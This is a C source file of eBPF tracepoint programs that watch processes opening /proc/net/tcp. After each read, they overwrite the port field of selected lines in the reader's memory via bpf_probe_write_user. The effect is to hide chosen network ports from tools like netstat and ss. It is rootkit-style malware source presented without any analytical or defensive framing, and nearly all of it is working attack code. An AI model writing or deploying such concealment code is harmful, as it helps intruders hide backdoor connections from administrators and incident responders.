#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u16);
    __type(value, __u8);
} hidden_ports SEC(".maps");

struct pending_open { char name[24]; };

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u64);
    __type(value, struct pending_open);
} pending_opens SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u64);
    __type(value, __u8);
} tracked_fds SEC(".maps");

struct pending_read { __u64 buf; __u32 total; };

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 512);
    __type(key, __u64);
    __type(value, struct pending_read);
} pending SEC(".maps");

struct scratch_line { char d[140]; };

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct scratch_line);
} scratch SEC(".maps");

struct sys_enter_openat_args {
    __u64 pad; long syscall_nr; long dfd; const char *filename;
    long flags; long mode;
};
struct sys_exit_openat_args {
    __u64 pad; long syscall_nr; long ret;
};
struct sys_enter_read_args {
    __u64 pad; long syscall_nr; long fd; char *buf; __u64 count;
};
struct sys_exit_read_args {
    __u64 pad; long syscall_nr; long ret;
};
struct sys_enter_close_args {
    __u64 pad; long syscall_nr; long fd;
};

static __always_inline int hex_val(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static __always_inline void check_and_hide(struct scratch_line *s,
                                            char *ubuf, __u32 line_off)
{
    int p0 = hex_val(s->d[15]);
    int p1 = hex_val(s->d[16]);
    int p2 = hex_val(s->d[17]);
    int p3 = hex_val(s->d[18]);
    if (p0 < 0 || p1 < 0 || p2 < 0 || p3 < 0) return;

    __u16 port = (__u16)((p0 << 12) | (p1 << 8) | (p2 << 4) | p3);
    __u8 *hide = bpf_map_lookup_elem(&hidden_ports, &port);
    if (!hide) return;

    char sp = ' ';
    bpf_probe_write_user(ubuf + line_off + 15, &sp, 1);
    bpf_probe_write_user(ubuf + line_off + 16, &sp, 1);
    bpf_probe_write_user(ubuf + line_off + 17, &sp, 1);
    bpf_probe_write_user(ubuf + line_off + 18, &sp, 1);
}

SEC("tracepoint/syscalls/sys_enter_openat")
int net_hide_openat_enter(struct sys_enter_openat_args *ctx)
{
    struct pending_open po = {};
    bpf_probe_read_user_str(po.name, sizeof(po.name), ctx->filename);

    if (po.name[0] != '/' || po.name[6] != 'n') return 0;

    __u64 ptg = bpf_get_current_pid_tgid();
    bpf_map_update_elem(&pending_opens, &ptg, &po, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int net_hide_openat_exit(struct sys_exit_openat_args *ctx)
{
    if (ctx->ret < 0) return 0;
    __u64 ptg = bpf_get_current_pid_tgid();
    struct pending_open *po = bpf_map_lookup_elem(&pending_opens, &ptg);
    if (!po) return 0;
    bpf_map_delete_elem(&pending_opens, &ptg);

    if (po->name[0]!='/' || po->name[1]!='p' || po->name[2]!='r' ||
        po->name[3]!='o' || po->name[4]!='c' || po->name[5]!='/' ||
        po->name[6]!='n' || po->name[7]!='e' || po->name[8]!='t' ||
        po->name[9]!='/' || po->name[10]!='t' || po->name[11]!='c' ||
        po->name[12]!='p') return 0;

    __u64 key = (ptg & 0xffffffff00000000ULL) | ((__u64)((__u32)ctx->ret));
    __u8 one = 1;
    bpf_map_update_elem(&tracked_fds, &key, &one, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_read")
int net_hide_read_enter(struct sys_enter_read_args *ctx)
{
    __u64 ptg = bpf_get_current_pid_tgid();
    __u64 key = (ptg & 0xffffffff00000000ULL) | ((__u64)((__u32)ctx->fd));
    __u8 *tracked = bpf_map_lookup_elem(&tracked_fds, &key);
    if (!tracked) return 0;

    struct pending_read pr = { .buf = (__u64)ctx->buf, .total = 0 };
    bpf_map_update_elem(&pending, &ptg, &pr, BPF_ANY);
    return 0;
}

#define HDR_LEN  150
#define LINE_LEN 150
#define MAX_LINES 16

SEC("tracepoint/syscalls/sys_exit_read")
int net_hide_read_exit(struct sys_exit_read_args *ctx)
{
    if (ctx->ret <= 0) return 0;
    __u64 ptg = bpf_get_current_pid_tgid();
    struct pending_read *pr = bpf_map_lookup_elem(&pending, &ptg);
    if (!pr) return 0;
    bpf_map_delete_elem(&pending, &ptg);

    char *ubuf = (char *)pr->buf;
    __u32 total = (__u32)ctx->ret;

    __u32 scratch_key = 0;
    struct scratch_line *s = bpf_map_lookup_elem(&scratch, &scratch_key);
    if (!s) return 0;

    __u32 off = HDR_LEN;
    int i;
    for (i = 0; i < MAX_LINES; i++) {
        if (off + 20 > total) break;

        if (bpf_probe_read_user(s->d, 20, ubuf + off) < 0) break;
        check_and_hide(s, ubuf, off);
        off += LINE_LEN;
    }
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_close")
int net_hide_close(struct sys_enter_close_args *ctx)
{
    __u64 ptg = bpf_get_current_pid_tgid();
    __u64 key = (ptg & 0xffffffff00000000ULL) | ((__u64)((__u32)ctx->fd));
    bpf_map_delete_elem(&tracked_fds, &key);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
